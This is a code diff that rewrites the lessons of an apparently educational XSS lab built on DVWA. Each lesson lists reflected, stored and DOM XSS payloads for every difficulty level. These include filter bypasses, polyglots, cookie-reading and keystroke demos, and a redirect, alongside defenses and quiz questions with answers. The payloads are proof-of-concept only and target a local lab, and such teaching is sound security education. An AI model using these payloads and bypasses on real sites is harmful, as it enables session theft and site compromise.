@@ -1,162 +1,239 @@
 const LESSONS = [
   {
-    title: "1. What is XSS?",
+    title: "1. What is XSS & Core Concepts",
     points: 20,
-    content: `Welcome to the XSS Lab! We are going to learn about "Cross-Site Scripting" (XSS).
+    content: `Welcome to the Comprehensive XSS Lab! We are going to master "Cross-Site Scripting" (XSS) across all DVWA difficulty levels and XSS types.
 
 WHAT IS XSS?
-Imagine a website is a magic whiteboard where people can leave messages for each other. XSS happens when a bad guy writes a secret spell (made of JavaScript code) on the board instead of a normal message. 
+Imagine a website is a magic whiteboard where people can leave messages for each other. XSS happens when an attacker writes a secret JavaScript spell on the board instead of a normal message. When a victim views the board, their browser accidentally executes the spell! This can steal cookies, log keystrokes, or perform unauthorized actions.
 
-When you look at the board, the board accidentally casts the spell on you! This spell can steal your cookies or make you do things you didn't want to.
+COMMON JAVASCRIPT FUNCTIONS USED IN XSS
+When crafting payloads, attackers rely on specific built-in JavaScript functions and properties:
+• alert(1) — Pops up an alert box (classic proof of concept).
+• confirm(1) — Pops up a confirmation dialog box.
+• prompt(1) — Pops up an input prompt box.
+• document.cookie — Accesses the victim's session cookies.
+• document.domain — Displays the domain of the current web page.
+• window.location — Redirects the victim to another URL (e.g., an attacker's server).
 
-STEP 1: Start the Lab
-Click the "Launch DVWA Instance" button. Wait for your tiny private computer to start.
+PRACTICE FLOW ROADMAP
+To master XSS, follow this structured learning path throughout the lab:
+1. Beginner: Learn basic tags like <script>alert(1)</script>, <img onerror>, and <svg onload>.
+2. Intermediate: Master event handlers (onfocus, onmouseover), filter bypasses, and encoded payloads.
+3. Advanced: Explore Polyglots, DOM sinks, CSP bypasses, and mutation XSS.
 
-STEP 2: Log In like a Boss
-Username: admin
-Password: password
+STEP 1: Start the Lab Environment
+Click the "Launch DVWA Instance" button above. Wait for your private Docker container to spin up.
 
-STEP 3: Setup the Game
-Scroll down and click "Create / Reset Database".
+STEP 2: Log In & Configure
+• Username: admin
+• Password: password
 
-STEP 4: Security Level
-Go to "DVWA Security" on the left menu. Make sure it is set to "Low" and click "Submit".`,
+STEP 3: Reset Database & Set Security Level
+Scroll down and click "Create / Reset Database". Then go to "DVWA Security" on the left menu, set the level to "Low", and click "Submit".`,
     questions: [
       { q: "What is the default username for our lab?", a: "admin" },
       { q: "What is the default password?", a: "password" },
-      { q: "What language are the secret spells (XSS attacks) usually written in?", a: "JavaScript" }
+      { q: "What language are XSS spells usually written in?", a: "JavaScript" },
+      { q: "Which JS function pops up a confirmation dialog box?", a: "confirm" }
     ]
   },
   {
-    title: "2. The Echo Trick (Reflected XSS)",
+    title: "2. DVWA XSS (Reflected)",
     points: 30,
-    content: `Reflected XSS is like an echo. You yell a magic spell into the website, and it yells it right back at you, accidentally casting it!
+    content: `Reflected XSS is like an echo. You send a malicious payload to the website (usually via a URL parameter), and the website immediately echoes it back into the response HTML without sanitizing it.
 
-HOW TO DO THE TRICK:
+Path: DVWA → XSS (Reflected)
 
-🟢 LOW LEVEL (The Bouncer is Asleep)
-1. Go to "DVWA Security" and set it to Low.
-2. Go to "XSS (Reflected)".
-3. Type this spell: <script>alert(1)</script>
-4. It works! A box pops up because the website echoed your code perfectly.
+🟢 EASY (LOW) — No Filtering
+The server blindly reflects the 'name' parameter. Try these categories:
+• Basic Alert Payloads:
+  <script>alert(1)</script>
+  <script>alert('XSS')</script>
+  <img src=x onerror=alert(1)>
+  <svg onload=alert(1)>
+• HTML Injection:
+  <h1>Hacked</h1>
+  <b>XSS TEST</b>
+• JavaScript Injection:
+  <script>document.write(document.cookie)</script>
+  <script>confirm(1)</script>
+• Cookie Theft Demo (Lab Only):
+  <script>alert(document.cookie)</script>
+• Event Handler Payloads:
+  <body onload=alert(1)>
+  <input onfocus=alert(1) autofocus>
+  <marquee onstart=alert(1)>
+• Filter Bypass & Encoded Payloads:
+  <ScRiPt>alert(1)</ScRiPt>
+  <script>alert(String.fromCharCode(88,83,83))</script>
+  <img src=1 onerror=alert(String.fromCharCode(88,83,83))>
+  %3Cscript%3Ealert(1)%3C/script%3E
 
-🟡 MEDIUM LEVEL (The Bouncer is confused)
-1. Change security to Medium. Try the spell again—it fails!
-2. The website is now looking for the word "script" and deleting it.
-3. Trick it by changing the capital letters: <SCRIPT>alert(1)</SCRIPT>
+🟡 MEDIUM — Script Tag Filtering
+Common Filters: Medium blocks the exact lowercase string <script>.
+Bypass using alternate payloads, mixed casing, or whitespace manipulation:
+• IMG Payload: <img src=x onerror=alert(1)>
+• SVG Payload: <svg onload=alert(1)>
+• IFRAME Payload: <iframe src=javascript:alert(1)>
+• Input Event Payload: <input autofocus onfocus=alert(1)>
+• Body Event Payload: <body onpageshow=alert(1)>
+• Mixed Case Bypass: <ImG sRc=x oNeRrOr=alert(1)> or <SCRIPT>alert(1)</SCRIPT>
+• Space Bypass: <img/src=x/onerror=alert(1)>
+• Encoded Bypass: <svg/onload=alert\`1\`>
 
-🔴 HIGH LEVEL (The Strict Bouncer)
-1. Change security to High. Now it deletes anything that looks like a script tag!
-2. We don't need a script tag. Let's send a broken image! 
-3. Type: <img src="x" onerror="alert(1)">
-4. The browser tries to load image "x", fails, and runs our spell instead!
+🔴 HARD (HIGH) — Strict Regex Protection
+Common Protections: High uses preg_replace() to strip anything matching <*script* in any case.
+Bypass by avoiding the word "script" entirely or leveraging precise contexts:
+• Advanced SVG Payload: <svg><script>alert(1)</script> (Note: DVWA strips <svg><script leaving >alert(1)</script>, demonstrating how aggressive regex breaks tags).
+• IMG OnError: <img src=x onerror=alert(document.domain)> (Works perfectly!).
+• Encoded Payload: &#60;script&#62;alert(1)&#60;/script&#62; (Bypasses server filter but renders as safe text).
+• JavaScript URI: <a href="javascript:alert(1)">click</a> (Stripped by regex).
+• Attribute Injection: " onmouseover="alert(1)
+• Autofocus Payload: <input autofocus onfocus=alert(1)>
+• Polyglot Payload: javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
 
-🛡️ IMPOSSIBLE LEVEL: The Translator Tool
-Why did it fail on Impossible mode?
-
-Imagine the website hired a very strict translator named "htmlspecialchars()".
-When you yell your secret spell into the website: <script>alert(1)</script>
-The translator catches the echo and says: "No way! These brackets (< and >) look dangerous!"
-
-Instead of echoing the dangerous brackets back to you, the translator changes them into safe, boring text codes.
-So, the website just safely prints the exact text you typed on the screen. The echo is completely harmless!`,
+🛡️ IMPOSSIBLE — Secure Output Encoding
+Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
+Reason: The server uses htmlspecialchars() for output encoding, along with CSP protections, input validation, and sanitization. Dangerous brackets (< and >) are converted to safe HTML entities (&lt; and &gt;), rendering the echo completely harmless!`,
     questions: [
       { q: "Which attack is like an echo yelling the spell back at you?", a: "Reflected XSS" },
       { q: "What tag can we use to run a spell when an image fails to load?", a: "img" },
-      { q: "What tool translates our attack into harmless safe text?", a: "htmlspecialchars" }
+      { q: "What tool translates our attack into harmless safe text on Impossible mode?", a: "htmlspecialchars" }
     ]
   },
   {
-    title: "3. The Poisoned Billboard (Stored XSS)",
+    title: "3. DVWA XSS (Stored)",
     points: 30,
-    content: `Stored XSS is the scariest one! It's like painting a poisoned spell permanently onto a billboard. Anyone who walks by and looks at the billboard gets attacked!
+    content: `Stored XSS is the most dangerous variant! It's like painting a poisoned spell permanently onto a billboard. The payload is saved in the database, attacking every user who views the page.
 
-HOW TO DO THE TRICK:
+Path: DVWA → XSS (Stored)
 
-🟢 LOW LEVEL
-1. Change security to Low. Go to "XSS (Stored)".
-2. In Name, type "Hacker". In Message, type: <script>alert('Stored!')</script>
-3. Sign the Guestbook. Boom! The spell is saved. If you refresh the page, it hits you again!
+🟢 EASY (LOW) — Basic Stored XSS
+The guestbook stores comments without escaping.
+• Name Field: test
+• Message Field: <script>alert(1)</script>
+• Cookie Access: <script>alert(document.cookie)</script>
+• Persistent Payload: <img src=x onerror=alert('stored xss')>
+• Redirect Payload: <script>window.location='http://example.com'</script>
+• Keylogger Demo (Lab Only):
+  <script>
+  document.onkeypress=function(e){
+    alert(e.key)
+  }
+  </script>
 
-🟡 MEDIUM LEVEL
-1. Change security to Medium. 
-2. The Message box is now safe, but the Name box is still vulnerable! 
-3. But wait, the Name box only lets you type 10 letters. 
-4. Right-click the Name box and click "Inspect" (DevTools). Find where it says maxlength="10" and change it to 100!
-5. Now type your spell in the Name box: <script>alert(1)</script>
+🟡 MEDIUM — Message Sanitization & Client-Side Limits
+In Medium, the Message box is fully sanitized using strip_tags() and htmlspecialchars(). However, the Name box only strips lowercase <script>.
+Bypass the 10-character HTML limit on the Name box:
+1. Right-click the Name box and select "Inspect" (DevTools).
+2. Find maxlength="10" and change it to maxlength="100".
+3. Inject these payloads into the Name field:
+• Script Tag Filter Bypass: <img src=x onerror=alert(1)>
+• SVG Payload: <svg onload=alert(1)>
+• Event Injection: <div onmouseover=alert(1)>hover me</div>
+• Encoded Script: &#60;script&#62;alert(1)&#60;/script&#62;
+• IFRAME Payload: <iframe src=javascript:alert(1)>
 
-🔴 HIGH LEVEL
-1. Change security to High. The Name box now deletes "script" tags.
-2. Change the maxlength to 100 again.
-3. Use a different spell: <svg onload="alert(1)">
+🔴 HARD (HIGH) — Regex Filtering on Name Field
+In High, the Name field uses strict regex to strip *script*. Expand the maxlength to 100 via DevTools and inject non-script payloads:
+• Advanced Payloads:
+  <svg/onload=alert(1)>
+  <img src=x onerror=alert(document.cookie)>
+  <a href=javascript:alert(1)>click</a> (Stripped by regex).
+• Attribute Escape: " autofocus onfocus=alert(1) x="
+• Polyglot Payload: </textarea><svg onload=alert(1)>
 
-🛡️ IMPOSSIBLE LEVEL: The Translator Tool
-Why did it fail on Impossible mode?
-
-Imagine the website hired a very strict translator named "htmlspecialchars()".
-When you type your secret spell: <script>alert(1)</script>
-The translator looks at it and says: "No way! These brackets (< and >) look dangerous!"
-
-Instead of saving the dangerous brackets to the database, the translator changes them into safe, boring text codes (like &lt; and &gt;).
-So, when the website paints your message on the billboard for everyone to see, it doesn't run the spell. It just safely prints the exact text you typed. The magic is completely broken before it even reaches the database!`,
+🛡️ IMPOSSIBLE — Absolute Defense
+Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
+Reason: The server implements strict HTML encoding (htmlspecialchars) on both Name and Message fields, enforces Content Security Policy (CSP), uses robust sanitization, and employs secure parameterized database queries (PDO).`,
     questions: [
-      { q: "Does Stored XSS save the spell permanently? (yes/no)", a: "yes" },
-      { q: "Which box has a restriction of 10 letters that we have to bypass?", a: "Name" },
-      { q: "What tool do we use to change the 10 letter limit?", a: "DevTools" }
+      { q: "Does Stored XSS save the spell permanently in the database? (yes/no)", a: "yes" },
+      { q: "Which box has a restriction of 10 letters that we have to bypass using DevTools?", a: "Name" },
+      { q: "What JS property gives access to the victim's session cookies?", a: "document.cookie" }
     ]
   },
   {
-    title: "4. The Inside Job (DOM XSS)",
+    title: "4. DVWA XSS (DOM)",
     points: 30,
-    content: `DOM XSS is a sneaky trick that happens entirely inside the victim's web browser. The server never even sees the spell!
+    content: `DOM XSS is a subtle vulnerability that occurs entirely inside the victim's web browser. The server never sees the attack payload because it is processed by insecure client-side JavaScript.
 
-HOW TO DO THE TRICK:
+Path: DVWA → XSS (DOM)
 
-🟢 LOW LEVEL
-1. Change security to Low and go to "XSS (DOM)".
-2. Look at the URL bar at the top: ?default=English
-3. Change it to: ?default=<script>alert(1)</script>
-4. The website's code reads the URL and blindly runs our spell!
+🟢 EASY (LOW) — URL-Based Execution
+The client-side script extracts the 'default' parameter from the URL and writes it directly into the page via document.write().
+• Basic URL Payload:
+  http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
+• IMG Payload:
+  http://localhost/dvwa/vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>
+• SVG Payload:
+  http://localhost/dvwa/vulnerabilities/xss_d/?default=<svg onload=alert(1)>
+• DOM Manipulation & Cookie Access:
+  ?default=<script>document.body.innerHTML='XSS'</script>
+  ?default=<script>alert(document.cookie)</script>
 
-🟡 MEDIUM & 🔴 HIGH LEVELS
-1. You can bypass filters using the hash symbol (#).
-2. The browser never sends the hash to the server! Try: ?default=English#<script>alert(1)</script>
+🟡 MEDIUM — Server-Side Substring Checks & Dropdown Breakout
+Medium checks the URL on the server side and redirects if it sees "<script".
+Bypass this by using alternate tags or leveraging the URL hash (#) fragment:
+• Encoded URL Payload: ?default=%3Cscript%3Ealert(1)%3C/script%3E (Caught by server).
+• IMG Payload (Dropdown Breakout): ?default=</option></select><img src=x onerror=alert(1)>
+• SVG Payload: ?default=</option></select><svg/onload=alert(1)>
+• Hash-Based Injection: ?default=English#<img src=x onerror=alert(1)> (The hash # is never sent to the server, completely bypassing server-side filters!).
 
-🛡️ IMPOSSIBLE LEVEL: innerHTML vs textContent
-Why couldn't we hack it on Impossible mode? Let's explain it simply:
+🔴 HARD (HIGH) — Strict Server-Side Whitelist
+High enforces a strict server-side whitelist containing only allowed languages ("English", "French", etc.).
+Bypass this entirely by placing your payload inside the URL hash fragment (#), which is processed exclusively by the client-side DOM:
+• Advanced DOM Payloads:
+  ?default=English#<svg onload=alert(document.domain)>
+  ?default=English#<iframe src=javascript:alert(1)>
+• Encoded Bypass: ?default=English#%3Csvg%20onload=alert(1)%3E
+• Polyglot Payload: ?default=English#javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
 
-Bad Way (innerHTML):
-Imagine the website takes your message and feeds it to a robot called 'innerHTML'. This robot is gullible. If your message is "Make a box pop up!", the robot will actually execute the command and make the box pop up. This is dangerous!
-
-Good Way (textContent):
-On Impossible mode, the developer fires the gullible robot and hires a smart robot called 'textContent'. When you tell 'textContent' to "Make a box pop up!", it refuses to obey. Instead, it just safely writes the words "Make a box pop up!" on the screen like a painting. It never runs your code!`,
+🛡️ IMPOSSIBLE — Safe DOM APIs & Native Encoding
+Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
+Reason: In Impossible mode, the application stops decoding the URI parameters and assigns the text using safe DOM manipulation APIs (such as textContent or innerText) instead of the dangerous innerHTML or document.write(). This forces the browser to treat the input as static text rather than executable code.`,
     questions: [
       { q: "Where does DOM XSS happen entirely? (Inside the...)", a: "browser" },
-      { q: "What symbol (#) hides our spell from the server?", a: "#" },
-      { q: "Which robot is gullible and runs dangerous code? (innerHTML or textContent)", a: "innerHTML" },
-      { q: "Which smart robot just paints the message safely on the screen without running it?", a: "textContent" }
+      { q: "What symbol (#) hides our attack payload from the server?", a: "#" },
+      { q: "Which dangerous DOM sink blindly executes code? (innerHTML or textContent)", a: "innerHTML" },
+      { q: "Which safe DOM API renders content strictly as static text?", a: "textContent" }
     ]
   },
   {
-    title: "5. How to Stop the Bad Guys",
-    points: 20,
-    content: `Now you know how hackers attack. But how do we defend the website?
+    title: "5. Bypasses, Tools & Ultimate Defense",
+    points: 30,
+    content: `To become an expert defender, you must understand both how advanced attackers bypass filters and how to implement airtight security controls.
 
+COMMON XSS FILTER BYPASSES
+When basic payloads fail, attackers use clever encoding and syntax tricks:
+• Mixed Case: <ScRiPt>alert(1)</ScRiPt> (Bypasses weak case-sensitive filters).
+• No Quotes: <img src=x onerror=alert(1)> (Bypasses quote stripping).
+• Backticks: <svg/onload=alert\`1\`> (Bypasses parenthesis filtering).
+• UTF Encoding: %3Cscript%3Ealert(1)%3C/script%3E (Bypasses basic WAF rules).
+
+AUTOMATED TESTING TOOLS
+Real-world bug bounty hunting relies on automated tools to scan at scale:
+1. Burp Suite (Intruder): Fuzz input parameters using SecLists XSS polyglots.
+2. XSStrike: An advanced XSS detection suite that analyzes context and dynamically generates custom working payloads.
+3. OWASP ZAP: Active Scan automatically fuzzes and identifies successful execution sinks.
+
+HOW TO STOP THE BAD GUYS (DEFENSIVE CONTROLS)
 1. THE BAD DEFENSE (Blacklisting)
-Trying to block specific bad words (like "<script>") is like playing whack-a-mole. Hackers will just find new bad words (like "<img onerror=">). It doesn't work!
+Trying to block specific bad words (like "<script>") is like playing whack-a-mole. Attackers will always find new vectors (like "<img onerror="). Blacklisting is ineffective!
 
-2. THE GOOD DEFENSE (Translation / Output Encoding)
-Whenever someone types a message, run it through a translator like "htmlspecialchars()". This turns dangerous magic spells into harmless, boring text before they hit the screen.
+2. THE GOOD DEFENSE (Context-Aware Output Encoding)
+Whenever user-supplied data is displayed, pass it through an encoding function like htmlspecialchars(). This converts dangerous characters (<, >, &, ", ') into safe HTML entities before rendering.
 
 3. THE GOOD ROBOT (Safe DOM APIs)
-If you are writing code in JavaScript, always use the safe "textContent" robot instead of the dangerous "innerHTML" robot.
+When writing client-side JavaScript, always use safe properties like textContent or innerText rather than dangerous sinks like innerHTML or document.write().
 
-4. THE SHIELD (Content Security Policy)
-This is a rule you put on your server that says: "Only run spells that I wrote myself. Never run spells written by visitors."`,
+4. THE SHIELD (Content Security Policy - CSP)
+Implement a robust HTTP header (Content-Security-Policy) that restricts where scripts can be loaded from and restricts inline script execution.`,
     questions: [
-      { q: "Is trying to block bad words (Blacklisting) a good defense? (yes/no)", a: "no" },
-      { q: "What defense translates dangerous spells into harmless text? (Output...)", a: "Output Encoding" },
-      { q: "What is the name of the rule that blocks spells from visitors? (Content Security...)", a: "Content Security Policy" }
+      { q: "Is trying to block bad words (Blacklisting) an effective defense? (yes/no)", a: "no" },
+      { q: "What defense translates dangerous characters into safe HTML entities? (Output...)", a: "Output Encoding" },
+      { q: "What is the name of the HTTP header rule that restricts script execution? (Content Security...)", a: "Content Security Policy" },
+      { q: "What advanced payload combines multiple syntax styles to bypass complex filters? (Poly...)", a: "Polyglot" }
     ]
   }
 ];
